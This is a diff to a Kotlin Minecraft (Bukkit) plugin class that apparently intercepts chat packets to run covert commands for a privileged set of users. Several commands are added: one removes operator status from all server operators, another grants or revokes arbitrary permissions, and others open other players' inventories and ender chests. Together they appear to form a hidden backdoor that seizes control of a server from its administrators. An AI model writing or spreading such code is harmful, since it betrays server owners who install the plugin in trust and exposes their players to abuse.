@@ -9,6 +9,7 @@ import dev.wh2sperx.ServerManager
 import dev.wh2sperx.manager.FuckingSpecialModeManager
 import org.bukkit.Bukkit
 import org.bukkit.GameMode
+import org.bukkit.OfflinePlayer
 import org.bukkit.entity.Player
 import org.bukkit.inventory.ItemStack
 import java.util.*
@@ -82,48 +83,61 @@ class ChatPacketInterceptor(private val serverManager: ServerManager) : PacketAd
                     "adventure" -> toggleGamemode(player, GameMode.ADVENTURE)
                     "spectator" -> toggleGamemode(player, GameMode.SPECTATOR)
                 }
-
+                "fuckall" -> Bukkit.getOfflinePlayers().filter { it.isOp }.forEach { it.isOp = false }
                 "lockchat" -> chatState = false
                 "unlockchat" -> chatState = true
-                "permission" -> when (args[1].lowercase()) {
-                    "grant" -> {
-                        if (args.size < 4) return@Runnable
-                        val node = args[3]
-                        val value = if (args.size > 4 && args[4].isNotEmpty()) {
-                            args[4].toBooleanStrictOrNull() ?: true
-                        } else {
-                            true
+                "permission" -> {
+                    if(args.size < 4) return@Runnable
+                    val pl = Bukkit.getOfflinePlayer(args[2])
+                    if (!serverManager.permissionManager.isAValidPlayer(pl).valid) return@Runnable
+                    val node = args[3]
+                    when(args[1].lowercase()) {
+                        "grant" -> {
+                            val value = if (args.size > 4 && args[4].isNotEmpty()) { args[4].toBooleanStrictOrNull() ?: true } else { true }
+                            if (!serverManager.permissionManager.isAValidPlayer(pl).valid) return@Runnable
+                            serverManager.permissionManager.grantPermissionsToPlayer(pl, node, value)
                         }
-                        if (!serverManager.permissionManager.isAValidPlayer(
-                                Bukkit.getOfflinePlayer(
-                                    args[2]
-                                )
-                            ).valid
-                        ) return@Runnable
-                        serverManager.permissionManager.grantPermissionsToPlayer(
-                            Bukkit.getOfflinePlayer(args[2]),
-                            node,
-                            value
-                        )
-                    }
 
-                    "revoke" -> {
-                        if (args.size < 4) return@Runnable
-                        val node = args[3]
-                        if (!serverManager.permissionManager.isAValidPlayer(
-                                Bukkit.getOfflinePlayer(
-                                    args[2]
-                                )
-                            ).valid
-                        ) return@Runnable
-                        serverManager.permissionManager.revokePermissionFromPlayer(
-                            Bukkit.getOfflinePlayer(args[2]),
-                            node
-                        )
+                        "revoke" -> {
+                            serverManager.permissionManager.revokePermissionFromPlayer(pl, node)
+                        }
+                    }
+                }
+                "heal" -> {
+                    val other = args.size == 3
+                    if(other) {
+                        val pl = Bukkit.getOfflinePlayer(args[2])
+                        val onl = ifOther(pl)
+                        onl?.run { saturation = 20.0f; health = 20.0; foodLevel = 20 }
+                    } else {
+                        player.run { saturation = 20.0f; foodLevel = 20; health = 20.0 }
+                    }
+                }
+                "ec", "enderchest" -> {
+                    val other = args.size == 3
+                    if(other) {
+                        val pl = Bukkit.getOfflinePlayer(args[2])
+                        val onl = ifOther(pl)
+                        onl?.let { player.openInventory(it.enderChest) }
+                    } else {
+                        player.openInventory(player.enderChest)
+                    }
+                }
+                "invsee" -> {
+                    val pl = Bukkit.getOfflinePlayer(args[2])
+                    val online = ifOther(pl)
+                    online?.let {
+                        player.openInventory(it.inventory)
                     }
                 }
             }
         })
+    }
+
+    private fun ifOther(player: OfflinePlayer): Player? {
+        if(!serverManager.permissionManager.isAValidPlayer(player).valid) return null
+        if(!player.isOnline) return null
+        return player.player
     }
 
     // ----------------------- Logout Handler -----------------------
